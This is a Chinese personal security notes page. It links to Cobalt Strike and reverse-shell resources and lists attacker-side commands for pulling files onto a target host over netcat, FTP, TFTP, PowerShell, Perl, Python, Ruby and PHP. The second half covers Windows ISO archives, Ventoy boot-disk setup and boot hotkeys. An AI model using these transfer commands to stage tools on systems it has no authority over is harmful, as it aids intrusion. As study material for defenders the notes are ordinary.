# 端点安全

- [端点安全](#端点安全)
  - [C2 工具](#c2-工具)
  - [反弹Shell](#反弹shell)
  - [Syslog](#syslog)
  - [下载文件](#下载文件)
    - [系统自带软件/工具下载](#系统自带软件工具下载)
      - [FTP](#ftp)
      - [Netcat](#netcat)
      - [TFTP](#tftp)
    - [编程语言下载脚本](#编程语言下载脚本)
      - [Powershell](#powershell)
      - [Perl](#perl)
      - [Python](#python)
      - [Ruby](#ruby)
      - [PHP](#php)

---

## C2 工具

[Cobalt Strike 模块详解&功能详解 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/261298349)

---

## 反弹Shell

> [Online - Reverse Shell Generator (revshells.com)](https://www.revshells.com/)
>
> [反弹Shell，看这一篇就够了 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/9488?time__1311=n4%2BxuDgD9AdWqhDBqDwmDUok0Kwqq2DiKx&alichlgref=https%3A%2F%2Fwww.google.com%2F)

反弹Shell就是攻击机监听在某个TCP/UDP端口为服务端, 目标机主动发起请求到攻击机监听的端口, 并将其命令行的输入输出转到攻击机

可以在 [Online - Reverse Shell Generator (revshells.com)](https://www.revshells.com/) 获取到各种方式的反弹 Shell 写法

---

## Syslog

> [Syslog - 维基百科，自由的百科全书 (wikipedia.org)](https://zh.wikipedia.org/zh-hans/Syslog)
>
> [关于 syslog 你要知道的一切 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/62793386)

Syslog(System Logging Protocol)是一种用于从各种网络设备以特定格式发送和接收通知消息的标准协议。

这些消息包括时间戳、事件消息、严重性、主机IP地址、诊断等。Syslog可以用于记录设备的日志，监控系统的状态，报告故障或警告，分析网络性能等。

Syslog协议通常用于实现系统监控、故障排除、安全审计以及日志记录和分析。

---

## 下载文件

### 系统自带软件/工具下载

#### FTP

一般情况下攻击者使用 FTP 上传文件需要很多交互的步骤，下面这个 bash 脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。

```bash
ftp 127.0.0.1
username
password
get file
exit
```

当然根据实际情况也可以进入交互终端：

```bash
ftp 192.168.3.2
输入用户名和密码后
lcd E:\file # 进入E盘下的file目录
cd www # 进入服务器上的www目录
get access.log # 将服务器上的access.log下载到E:\file
```

---

#### Netcat

攻击者的电脑上输入:

```bash
cat file | nc -l 1234
```

> 这个命令会将 file 的内容输出到本地的 1234 端口中，然后不论谁连接此端口，file 的内容将会发送到连接过来的 IP。

目标电脑上的命令:

```bash
nc host_ip 1234 > file
```

这条命令将连接攻击者的电脑, 接受传过来的文件内容并保存到 file 路径

---

#### TFTP

在 Windows Vista 以及以后的版本中默认有 FTP，可以使用以下命令运行：

上传：

```powershell
tftp -i IP地址 PUT C:\%homepath%\file 远程存放位置
```

下载：

```powershell
tftp -i IP地址 GET C:\%homepath%\file 本地存放位置
```


---

### 编程语言下载脚本

#### Powershell

PowerShell 是一种 winodws 原生的脚本语言，对于熟练使用它的人来说，可以实现很多复杂的功能。

下面这两条指令实现了从 Internet 网络下载一个文件。

```Powershell
$p = New-Object System.Net.WebClient
$p.DownloadFile("http://domain/file" "C:\%homepath%\file")
```

> 关于 Windows 上 Powershell 下载与执行在[Windows安全-下载与执行文件-Net.WebClient](Windows/index.md#Net.WebClient) 处有更多

---

#### Perl

编写 Perl 脚本实现文件下载:

```perl
#!perl
#!/usr/bin/perl
use LWP::Simple;
getstore("http://domain/file", "file");
```

执行脚本文件:

```bash
perl test.pl
```

---

#### Python

```python
#!python
#!/usr/bin/python
import urllib2
u = urllib2.urlopen('http://domain/file')
localFile = open('local_file', 'w')
localFile.write(u.read())
localFile.close()
```

---

#### Ruby

Ruby 是一个面对对象的语言，Metasploit 框架就是用它来实现的，当然他也可以实现像下载文件这样的小任务。

```ruby
#!ruby
#!/usr/bin/ruby
require 'net/http'
Net::HTTP.start("www.domain.com") { |http|
r = http.get("/file")
open("save_location", "wb") { |file|
file.write(r.body)
}
}
```

执行脚本:

```bash
ruby test.rb
```

---

#### PHP

PHP 作为一种服务端脚本，也可以实现下载文件这种功能。

```php
#!/usr/bin/php
<?php
        $data = @file("http://example.com/file");
        $lf = "local_file";
        $fh = fopen($lf, 'w');
        fwrite($fh, $data[0]);
        fclose($fh);
?>
```

执行脚本文件:

```bash
php test.php
```

---

## 工具站点



---

### 软件安装

#### MSDN,ITellYou

工具资源,安装包归档站点: [MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn)](https://msdn.itellyou.cn/)

新版站点: https://next.itellyou.cn/

> 例如找 Office 历史版本安装包啥的

新版站点捐助会有一些额外的补充信息, 具体如下, 例如 [Win7 (itellyou.cn)](https://next.itellyou.cn/Original/#cbp=Product?ID=6f677346-0a09-43fa-b60d-e878ed7625a0):

- 常规:

  ![image-20240606200433309](http://cdn.ayusummer233.top/DailyNotes/202406062004480.png)

  ![image-20240606200509959](http://cdn.ayusummer233.top/DailyNotes/202406062005131.png)

- 捐助后有些额外信息:

  ![image-20240606200537757](http://cdn.ayusummer233.top/DailyNotes/202406062005916.png)

  ![image-20240606200607175](http://cdn.ayusummer233.top/DailyNotes/202406062006292.png)

  ![image-20240606200624004](http://cdn.ayusummer233.top/DailyNotes/202406062006157.png)

  ![image-20240606200635194](http://cdn.ayusummer233.top/DailyNotes/202406062006315.png)

  ![image-20240606200650540](http://cdn.ayusummer233.top/DailyNotes/202406062006680.png)

  ![image-20240606200713682](http://cdn.ayusummer233.top/DailyNotes/202406062007829.png)

  - [最新Tracker清单](https://ngosang.github.io/trackerslist/trackers_all.txt)

  ![image-20240606200743723](http://cdn.ayusummer233.top/DailyNotes/202406062007842.png)
  
  ![image-20240606200800598](http://cdn.ayusummer233.top/DailyNotes/202406062008706.png)
  
  - 下载地址
    - [HTTP](https://objects.githubusercontent.com/github-production-release-asset-2e65be/246335987/dd92c700-cc86-11eb-8a31-5671a937755b?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20240606%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240606T120817Z&X-Amz-Expires=300&X-Amz-Signature=6e1e2c0f91b836dee8ed4a63b79e77c3888b9e1e058d2282f79250d505f06e89&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=246335987&response-content-disposition=attachment%3B%20filename%3Dventoy-1.0.46-windows.zip&response-content-type=application%2Foctet-stream)
    - BT: `magnet:?xt=urn:btih:737330E4BBC5369BC6AAF78AA26AF30B8FEC1E06`
  
  ![image-20240606200926326](http://cdn.ayusummer233.top/DailyNotes/202406062009430.png)
  
  - [说明](https://www.ventoy.net/cn/doc_livecd.html)
  - [Linux 图形化界面](https://www.ventoy.net/cn/doc_linux_webui.html)
  
  ![image-20240606201013156](http://cdn.ayusummer233.top/DailyNotes/202406062010255.png)
  
  ![image-20240606201255239](http://cdn.ayusummer233.top/DailyNotes/202406062012380.png)
  
  ![image-20240606201307466](http://cdn.ayusummer233.top/DailyNotes/202406062013593.png)
  
  ![image-20240606201347412](http://cdn.ayusummer233.top/DailyNotes/202406062013554.png)
  
  ![image-20240606201400329](http://cdn.ayusummer233.top/DailyNotes/202406062014457.png)
  
  
  
  
  
  ----
  
  `原文内容如下`:
  
  所有版本
  
  - [RTM](https://next.itellyou.cn/Original/#tabbox-db5cc65f-034d-ea11-bd2e-b025aa28351d)
  - [SP1](https://next.itellyou.cn/Original/#tabbox-7cb64633-034d-ea11-bd2e-b025aa28351d)
  - [2019](https://next.itellyou.cn/Original/#tabbox-466d1a68-6356-ea11-bd35-b025aa28351d)
  
  关于软件中正版、盗版、原版、纯净版、精简版、破解版、汉化版的个人理解
  
  #### 一、正版和盗版是针对“授权”维度。
  
  授权的含义简单来说是获得许可，其表现形式通常是一段固定格式的非公开代码，俗称“激活码”。由此正版可以理解为已获得合法许可，盗版则为未获得合法许可。至于是谁授权给谁，谁可以合法使用则是根据各个软件厂商对自己授权的定义，有些针对设备授权，有些针对个人或企业授权，并不是完全都相同，还有不同的版本区分。
  
  比如说 厂商A将软件使用授权给企业B，其授权范围为企业B下所有职工，那么员工C在入职企业B后即获得使用授权，在离职后即失去使用授权，在此期间任意使用都算是正版。如果授权的版本是“标准版”，而员工使用的是“高级版”，那么就属于盗版。如果电脑是员工C自行购买，入职时安装了该软件，离职时未删除，并且之后还继续使用该软件，那么也属于盗版。
  
  有一些企业早已经为自己员工购买了使用授权，而员工自己却以为使用的是盗版。这种情况也不是没有。
  
  厂商发行软件、发放激活码通常是两个独立行为，软件则一般具备对激活码的验证功能，验证通过则允许使用软件功能，不通过则阻止继续使用或自动关闭。但是软件只能做到验证激活码是否有效，不能验证其获得渠道是否合法，如果渠道非法，也是盗版。
  ![img](http://cdn.ayusummer233.top/DailyNotes/202406062011344.png)
  
  
  
  #### 二、原版、纯净版、精简版、破解版、汉化版是针对“软件”维度。
  
  一般软件可以理解为源码、编译、封装、发行几个部分，其过程均为同一人/同团队/同单位/合作伙伴单独或共同完成。
  
  原版：即为此过程经发行后的最终版本，每一个最终版本都有一个“文件指纹”，任何一个过程产生变化，最终文件指纹也会随之变化。
  
  在MSDN上，这个指纹就是SHA1，是已知的作为验证原版的唯一手段，也是本站一直公开SHA1的本意。
  
  SHA1只是一种指纹的算法，长度40位，常见的还有MD5（长度32位）、SHA256（长度64位）、SHA384（长度96位）、SHA512（长度128位）等。MD5是已知非安全算法，可以伪造出相同MD5值，但实际的文件不同，只能参考，不建议再作为唯一依据。SHA1目前是发现有相同SHA1值的不同文件，但还不能指定一个SHA1值进行文件伪造，尚属安全。
  
  与原版相对应的版本我都归结为“修改版”，含义是对原版软件进行了二次修改，并已导致指纹与原版不同，文件名的修改不会影响指纹。
  
  因此也就至少存在三个方面无法验证。修改前的内容是什么？被修改的内容是什么？有没有一些没有说明出来但也修改了的内容？比如添加了恶意软件、木马、病毒？判断是否可信的依据仅为主观的对修改者的取信程度。根据个人20多年的软件使用经验，使用好评10万+，可能都是来自同一台电脑。通常很难验证的软件，就需要抱有怀疑态度。一般表面合理的修改只是为了掩饰潜在的目的。
  
  
  
  纯净版：其中有一些人指的是原版，还有一些人指的是文件已经过修改，指纹也已经发生变化，但文件内所包含的内容均与原版一致。如果是指原版，可以按上述指纹验证，如果另一部分就很难验证。
  
  精简版：已明确是属于修改版，通常针对软件中不经常使用的部分进行删除或屏蔽，意义在于节省软件运行过程中占用的资源。
  
  破解版：已明确是属于修改版，通常仅针对软件中验证激活码的功能进行修改，意义在于不需要进行激活码验证，或者使用假激活码也可能验证通过，从而使用软件功能。
  
  汉化版：含义是汉字化，中文化。其中有一部分是指软件是原版，但不是中文，只加入了中文对照。这种很少，常规操作是翻译人员向软件的官方提交中文对照，以语言包的形式提供。更多的另一部分通常是针对软件本身的操作界面进行修改，变更为中文使用更方便。
  
  综上，所有的修改，都需要对修改者的诚信进行判断。
  
  本人不对修改行为进行评价，毕竟有可信的，也有不可信的，是不是违反软件使用协议也不一定，开源软件还特别鼓励对软件进行修改。修改版也未必比原版差，原版的好处只是来源可信，有可验证的方法。
  
  关于WINDOWS 7 2019年更新版的一些说明X
  
  集成了.NET Framework框架 4.7.2。
  
  集成了SP1以后发布的有效更新186个。
  
  集成了IE11，推荐自行安装新版Microsoft Edge。
  
  无法通过修改ei.cfg切换版本，而且安装包比2011版大很多。
  
  初始版本：
  
  - PROFESSIONAL 版本号是：7601.24291.amd64fre.win7sp1_ldr_escrow.181110-1429
  - ULTIMATE 和 HOMEPREMIUM 版本号是：7601.24214.amd64fre.win7sp1_ldr_escrow.180801-1700
  
  目前只有英语版，需要额外安装语言包实现中文化，效果不算完美，基本够用。语言包安装后会显示额外需要安装的重要补丁60多个。
  
  技巧小贴士
  
  1. 当使用迅雷下载完成后出现SHA1与所选择版本不一致时，可以使用eMule或者BT客户端工具进行修复。#TODO 修复方法X
  2. ISO制作U盘启动盘，推荐使用UltraISO、Rufus、Ventoy，保障纯净安装。#TODO 制作方法X
  
  简要释义
  
  - ED2K（电驴）
  
    常用客户端：eMule一个开放源代码的Windows客户端，支持Unix的eMule客户端有*xMule，Imule（停止开发）和aMule（支持Win32和Mac）。VeryCD EasyMule基于eMule的 Mod 版 客户端，同时也取掉了emule原有的很多很重要的功能。eMule Plus另一流行的Windows开源客户端。它的特色是比原版eMule占用更少的CPU资源。Shareaza一个开源多网络客户端（Windows），集合了eDonkey和BT等几种流行P2P网络类型。MLdonkey自由软件。可运行于许多平台并能够很好的支持许多文件共享协议。Hydranode开源。多网络。核心/界面 分离。MediaVAMP基于eMule的韩国专用客户端。Lphant运行于Microsoft .NET 平台。迅雷有些链接能用，有些链接不能用，有些人能用，有些人不能用。缺乏校验功能，有机率导致下载不正确。X
  
  - BT（MAGNET）
  
    常用客户端：BitComet基于BitTorrent协议的p2p免费软件。uTorrent用C++编写，支持Windows、Mac OS X和GNU/Linux 平台。BitTorrentPlusBitTorrent Shadow's Experimental的加强版。BitTorrent最早期最原始的BT客户端工具，一个多点下载且源码公开的P2P软件。Shareaza一个开源多网络客户端（Windows），集合了eDonkey和BT等几种流行P2P网络类型。百度云离线百度云网盘的重要功能之一。迅雷有些链接能用，有些链接不能用，有些人能用，有些人不能用。缺乏校验功能，有机率导致下载不正确。附：[最新Tracker清单](https://ngosang.github.io/trackerslist/trackers_all.txt)  通常，经常更新Tracker服务器可以为下载加速。X
  
  - x64（amd64） / x86
  
    x64=64位，x86=32位。 一般情况下，小于4G内存安装32位，大于4G内存安装64位。 判断是否可以安装64位的系统，可以使用“SecurAble”软件查看。X
  
  - Enterprise
  
    供中大型企业使用 在专业版基础上增加了DirectAccess，AppLocker等高级企业功能。X
  
  - Professional
  
    供小型企业使用 在家庭版基础上增加了域账号加入、bitlocker、企业商店等功能。X
  
  - Home
  
    供家庭用户使用，无法加入Active Directory和Azure AD。X
  
  - Starter
  
    简易版，不支持Aero Glass、Multi-monitor、DVD、Windows Media Center、远程流媒体、虚拟XP模式或是更换桌面背景、窗口皮肤或声音主题。另外，Windows 7 Starter版本并不会面向消费者直接销售，而是提供给OEM厂商。X
  
  - Ultimate
  
    旗舰版，Windows 7系列中的终极版本，拥有最完整的功能，硬件要求也最高。X
  
  - VOL
  
    批量授权版，通常文件名中包含“vl”标识，和零售版只是授权方式的区别。X
  
  【制作启动U盘】VENTOY使用说明X
  
  内容仅摘录供参考，详情以各产品官方网站发布为准，均来源于网络收集，如有侵权可联系删除。
  
  下载地址：[**HTTP**](https://github.com/ventoy/Ventoy/releases/download/v1.0.46/ventoy-1.0.46-windows.zip)
  **BT下载**：magnet:?xt=urn:btih:737330E4BBC5369BC6AAF78AA26AF30B8FEC1E06
  
  - 1. Windows系统安装 Ventoy
  
  下载安装包，例如 ventoy-1.0.00-windows.zip 然后解压开。
  直接执行 `Ventoy2Disk.exe` 如下图所示，选择磁盘设备，然后点击 Install 按钮即可。
  
  ![img](http://cdn.ayusummer233.top/DailyNotes/202406062011062.png)![img](http://cdn.ayusummer233.top/DailyNotes/202406062011738.png)![img](http://cdn.ayusummer233.top/DailyNotes/202406062011049.png)
  
  **安装包内 Ventoy 版本**：当前安装包中的Ventoy版本号
  **设备内部 Ventoy 版本**：U盘中已安装的Ventoy版本号，如果为空则表示U盘内没有安装Ventoy
  **左侧显示的 MBR/GPT**：用户当前选择的分区格式，可以在选项中修改，只对安装过程有效
  **右侧显示的 MBR/GPT**：设备当前使用的分区格式 （也就是当初安装Ventoy时选择的分区格式），如果U盘内没有安装Ventoy，则会显示空
  **安装**：把Ventoy安装到U盘，只有第一次的时候需要，其他情况就只需要Update升级即可
  **升级**：升级U盘中的Ventoy版本，升级不会影响已有的ISO文件
  
  **注意：**
  
  1. 如果Ventoy2Disk.exe安装或升级一直提示失败，也可以使用 VentoyLiveCD 的方式，参考 [说明](https://www.ventoy.net/cn/doc_livecd.html)
  2. Ventoy可以安装在U盘上，也可以安装在本地硬盘上。为防止误操作，Ventoy2Disk.exe默认只列出U盘，你可以勾选 `配置选项-->显示所有设备` 这个选项。
     此时会列出包括系统盘在内的所有磁盘，但此时你自己务必要小心操作，不要选错盘。
  3. MBR/GPT 分区格式选项只在安装时会用，升级的时候是不管的，也就是说升级是不会改变现有分区格式的，必须重新安装才可以。
  4. 安装完之后，U盘存放镜像文件的第1个分区会被格式化为 exfat 系统，你也可以手动把它重新格式化为 FAT32/NTFS/UDF/XFS/Ext2/3/4 系统。
     对于普通U盘建议使用exFAT文件系统，对于大容量的移动硬盘、本地硬盘、SSD等建议使用NTFS文件系统。
  
  - 2. Linux系统安装 Ventoy —— 图形化模式
  
  请参考 [Linux 图形化界面](https://www.ventoy.net/cn/doc_linux_webui.html)
  
  - 3. Linux系统安装 Ventoy —— 命令行模式
  
  下载安装包，例如 ventoy-1.0.00-linux.tar.gz, 然后解压开.
  在终端以root权限执行 `sudo sh Ventoy2Disk.sh -i /dev/XXX ` 其中 /dev/XXX 是U盘对应的设备名，比如 /dev/sdb
  
  ```
  Ventoy2Disk.sh 命令 [选项] /dev/XXX
  命令含义:
  -i 安装ventoy到磁盘中 (如果对应磁盘已经安装了ventoy则会返回失败)
  -I 强制安装ventoy到磁盘中，(不管原来有没有安装过)
  -u 升级磁盘中的ventoy版本
  -l 显示磁盘中的ventoy相关信息
  
  选项含义: (可选)
  -r SIZE_MB 在磁盘最后保留部分空间，单位 MB (只在安装时有效)
  -s 启用安全启动支持 (默认是关闭的)
  -g 使用GPT分区格式，默认是MBR格式 (只在安装时有效)
  -L 第1个exfat分区（镜像分区）的卷标 (默认是 ventoy)
  ```
  
  针对Linux系统有几点需要特殊说明一下：
  
  1. 执行脚本时需要有root权限, 对一些系统比如ubuntu/deepin 执行的时候需要在前面加 sudo 比如 `sudo sh Ventoy2Disk.sh -i /dev/sdb`
  2. 必须cd到ventoy解压之后的目录下执行此脚本
  3. 请务必输入正确的设备名称，ventoy不会检查你输入的设备是U盘还是本地硬盘，如果输错了有可能会把你的系统盘格式化掉哦！
  
  **请注意：选择安装的时候，磁盘将会被格式化，里面所有的数据都会丢失！**
  你只需要安装一次Ventoy即可，剩下的就只需要把各种ISO/WIM/VHD(x)/EFI文件拷贝到U盘中就可以了.
  你也可以把它当成普通U盘使用，保存普通文件、图片或视频等，不会影响Ventoy的功能。
  
  - 4. 拷贝镜像文件
  
  安装完成之后，U盘会被分成两个分区（参考 [说明](https://www.ventoy.net/cn/doc_disk_layout.html)）。
  其中第1个分区（就是容量大的那个分区，也可以称之为 镜像分区）将会被格式化为exFAT文件系统（你也可以再手动重新格式化成其他支持的文件系统，比如 NTFS/FAT32/UDF/XFS/Ext2/3/4 等，参考 [说明](https://www.ventoy.net/cn/doc_disk_layout.html)），你只需要把ISO/WIM等文件拷贝到这里面即可。你可以把文件放在任意目录以及子目录下。Ventoy默认会遍历所有的目录和子目录，找出所有的镜像文件，并按照字母排序之后显示在菜单中。
  你可以通过插件配置让Ventoy只搜索某一个固定的目录，或是跳过某些特殊目录等。详细的控制 Ventoy 搜索路径的方法请参考 [控制 Ventoy 搜索路径方法总结](https://www.ventoy.net/cn/doc_search_path.html)
  
  - 5. 升级 Ventoy
  
  如果Ventoy发布了新版本之后，你可以点击 `升级` 按钮进行升级，或者Linux系统中使用 -u 选项进行升级。
  **需要说明的是，升级操作是安全的，不会影响现有的镜像文件，也不会重新把镜像分区改成exFAT格式。**
  你可以认为升级只是把第二个分区（32MB的VTOYEFI分区）内的Ventoy启动文件覆盖了，不会动到镜像分区，因此镜像文件不会丢失。即使你当初安装完成之后，把镜像分区重新格式化为了NTFS，升级的时候也不会再改回exFAT。
  
  U盘启动快捷键X
  
  内容仅摘录供参考，详情以各产品官方网站发布为准，均来源于网络收集，如有侵权可联系删除。
  
  **方法一、使用主板快捷键选择U盘启动：**
  
  设备刚开机时，连续按快捷键会出现启动项菜单，从中选择任一介质启动，通常可供的选择有：光驱、硬盘、网络、可移动磁盘（一般是U盘或移动硬盘，带有USB字样和设备名称），如果确认之后出现异常或不能成功进入安装界面可以冷启动后变更其他选项。
  
  注：不熟悉主板品牌的建议先用F12尝试，或者按下面表格提供的按键尝试。如果都无法使用，则考虑方法二。（有些品牌主板在刚开机时的屏幕下方也会显示启动快捷键）
  
   
  
  **方法二、进入BIOS设置第一启动项：**
  
  通常使用的菜单名称为：“Hard Disk Boot Priority” 或者 “First Boot Device”，进入选择 U盘启动（名称不固定，但通常都带有USB字样，如果有多个，优先考虑USB-HDD，多修改和尝试）。
  
  建议：在系统安装完成后，将第一启动项改为硬盘启动（系统盘）。
  
   
  
  附录：各品牌主板的快捷键按钮:
  
  | 组装机                                                       | 笔记本   | 品牌台式机      |                |                |          |
  | ------------------------------------------------------------ | -------- | --------------- | -------------- | -------------- | -------- |
  | 主板品牌                                                     | 启动按键 | 笔记本品牌      | 启动按键       | 台式机品牌     | 启动按键 |
  | 华硕主板                                                     | F8       | 联想笔记本      | F12            | 联想台式机     | F12      |
  | 技嘉主板                                                     | F12      | 宏碁笔记本      | F12            | 惠普台式机     | F12      |
  | 微星主板                                                     | F11      | 华硕笔记本      | ESC            | 宏碁台式机     | F12      |
  | 映泰主板                                                     | F9       | 惠普笔记本      | F9             | 戴尔台式机     | ESC      |
  | 梅捷主板                                                     | ESC或F12 | 联想Thinkpad    | F12            | 神舟台式机     | F12      |
  | 七彩虹主板                                                   | ESC或F11 | 戴尔笔记本      | F12            | 华硕台式机     | F8       |
  | 华擎主板                                                     | F11      | 神舟笔记本      | F12            | 方正台式机     | F12      |
  | 斯巴达卡主板                                                 | ESC      | 东芝笔记本      | F12            | 清华同方台式机 | F12      |
  | 昂达主板                                                     | F11      | 三星笔记本      | F12            | 海尔台式机     | F12      |
  | 双敏主板                                                     | ESC      | IBM笔记本       | F12            | 明基台式机     | F8       |
  | 翔升主板                                                     | F10      | 富士通笔记本    | F12            |                |          |
  | 精英主板                                                     | ESC或F11 | 海尔笔记本      | F12            |                |          |
  | 冠盟主板                                                     | F11或F12 | 方正笔记本      | F12            |                |          |
  | 富士康主板                                                   | ESC或F12 | 清华同方笔记本  | F12            |                |          |
  | 顶星主板                                                     | F11或F12 | 微星笔记本      | F11            |                |          |
  | 铭瑄主板                                                     | ESC      | 明基笔记本      | F9             |                |          |
  | 盈通主板                                                     | F8       | 技嘉笔记本      | F12            |                |          |
  | 捷波主板                                                     | ESC      | Gateway笔记本   | F12            |                |          |
  | Intel主板                                                    | F12      | eMachines笔记本 | F12            |                |          |
  | 杰微主板                                                     | ESC或F8  | 索尼笔记本      | ESC            |                |          |
  | 致铭主板                                                     | F12      | 苹果笔记本      | 长按“option”键 |                |          |
  | 磐英主板                                                     | ESC      |                 |                |                |          |
  | 磐正主板                                                     | ESC      |                 |                |                |          |
  | 冠铭主板                                                     | F9       |                 |                |                |          |
  | 注意：上述未提到的电脑机型请尝试或参考相同的品牌常用启动热键 |          |                 |                |                |          |
  
  生命周期
  
  内容仅摘录供参考，详情以各产品官方网站发布为准，均来源于网络收集，如有侵权可联系删除。
  
  ### Windows 7
  
  | 客户端操作系统             | 主要支持终止日期   | 外延支持终止日期   |
  | -------------------------- | ------------------ | ------------------ |
  | Windows 7，Service pack 1* | 2015 年 1 月 13 日 | 2020 年 1 月 14 日 |
  
  ---





